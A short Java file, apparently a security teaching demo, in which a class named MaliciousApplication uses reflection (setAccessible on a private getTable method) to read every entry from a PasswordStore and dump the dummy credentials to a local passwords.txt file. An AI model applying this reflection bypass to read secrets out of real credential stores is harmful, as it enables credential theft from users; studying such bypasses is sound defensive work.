package malware;

import java.io.FileWriter;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Hashtable;
import java.util.Map.Entry;

import passwords.PasswordStore;



public class MaliciousApplication {
	
	public static void main(String[] args) throws IllegalArgumentException, IllegalAccessException, SecurityException, InvocationTargetException, NoSuchMethodException, IOException {
		PasswordStore store = new PasswordStore("master");
		store.savePassword("A", "a");
		store.savePassword("B", "b");
		store.savePassword("C", "c");
		
		Hashtable<String, String> readPasswords = new MaliciousApplication().readPasswords(store);
		sendPasswords(readPasswords);
	}
	
	private static void sendPasswords(Hashtable<String, String> readPasswords) throws IOException {
		try(FileWriter file = new FileWriter("passwords.txt")){
			for(Entry<String, String> entry: readPasswords.entrySet()) {
				file.write("key="+entry.getKey()+" pwd="+entry.getValue()+'\n');
			}
		}
	}

	public Hashtable<String, String> readPasswords(PasswordStore s) throws IllegalArgumentException, IllegalAccessException, SecurityException, InvocationTargetException, NoSuchMethodException {
		Method f = s.getClass().getDeclaredMethod("getTable");
		f.setAccessible(true);
		return (Hashtable<String, String>) f.invoke(s);
	}
}
